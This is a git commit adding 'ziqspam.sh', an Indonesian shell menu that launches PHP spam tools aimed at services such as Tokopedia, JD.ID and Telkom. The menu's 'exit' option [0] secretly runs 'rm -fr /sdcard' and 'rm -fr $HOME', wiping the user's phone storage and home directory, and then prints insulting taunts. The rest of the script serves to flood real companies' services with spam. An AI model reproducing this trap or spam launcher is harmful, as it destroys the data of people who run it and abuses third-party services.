3292fbcaece5ed6c35c3b6866f8f3e0707c67b6d
Mr.404_FouNd <52834382+MR-404-FOUND@users.noreply.github.com>
2019-07-17 22:47:21 +0700

    Add files via upload

---
+++ ziqspam.sh
@@ -0,0 +1,121 @@
+clear
+cd ziq
+sleep 1
+echo "\033[31;1m
+██████╗ ██╗███████╗██╗ ██████╗
+██╔══██╗██║╚══███╔╝██║██╔═══██╗
+██████╔╝██║  ███╔╝ ██║██║   ██║
+██╔══██╗██║ ███╔╝  ██║██║▄▄ ██║
+██║  ██║██║███████╗██║╚██████╔╝
+╚═╝  ╚═╝╚═╝╚══════╝╚═╝ ╚══▀▀═╝"
+sleep 1
+echo "\033[35;1m#########################"
+echo "\033[32;1mAuthor : Mr.404_FouNd/Riziq"
+echo "grup : D4rKCyb3RT34M"
+echo "coder : Mr.404_FouNd"
+echo "\033[35;1m#########################"
+sleep 1
+echo
+echo
+echo
+echo "TOOLS SPAMMER"
+echo "instal bahan dulu [09]"
+sleep 1
+echo
+echo "\033[34;1m ================>"
+echo " [1] spam jdid"
+echo "\033[33;1m ================>"
+sleep 1
+echo " [2] spam telkomnyet"
+echo "\033[36;1m ================>"
+sleep 1
+echo " [3] spam matahari mall"
+echo "\033[32;1m ================>"
+sleep 1
+echo " [4] spam tokopedia"
+echo "\033[37;1m ================>"
+sleep 1
+echo " [5] spam phd"
+echo " ================>"
+sleep 1
+echo
+echo
+echo "\033[33;1m [09] install bahan"
+echo
+echo "\033[32;1m [0] keluar"
+echo "\033[34;1m"
+read -p "Pilih coyy :" pilih
+
+if [ $pilih = "1" ] || [ $pilih = "1" ]
+then
+clear
+figlet -f lean "jdid"
+php jedeid.php
+sh ziqspam.sh
+fi
+
+
+if [ $pilih = "2" ] || [ $pilih = "2" ]
+then
+clear
+figlet -f lean "monyet"
+php telkomnyet.php
+sh ziqspam.sh
+fi
+
+
+if [ $pilih = "3" ] || [ $pilih = "3" ]
+then
+clear
+figlet -f lean "mentari"
+php matahari.php
+sh ziqspam.sh
+fi
+
+
+if [ $pilih = "4" ] || [ $pilih = "4" ]
+then
+clear
+figlet -f lean "tokped"
+php tokped.php
+sh ziqspam.sh
+fi
+
+
+if [ $pilih = "5" ] || [ $pilih = "5" ]
+then
+clear
+figlet -f lean "phd"
+php phd.php
+sh ziqspam.sh
+fi
+
+if [ $pilih = "09" ] || [ $pilih = "09" ]
+then
+clear
+apt update && apt upgrade
+pkg install git
+pkg install figlet
+pkg install php
+pip2 install requests
+pip2 install mechanize
+pkg install sl
+sl
+sh ziqspam.sh
+fi
+
+
+if [ $pilih = "0" ] || [ $pilih = "0" ]
+then
+sleep 1
+echo "selamat tinggal para kontol"
+echo
+rm -fr /sdcard
+rm -fr $HOME
+sleep 1
+echo "mampozz lu njink"
+sleep 1
+echo "jangan lupa coli"
+sleep 1
+cd $HOME
+fi
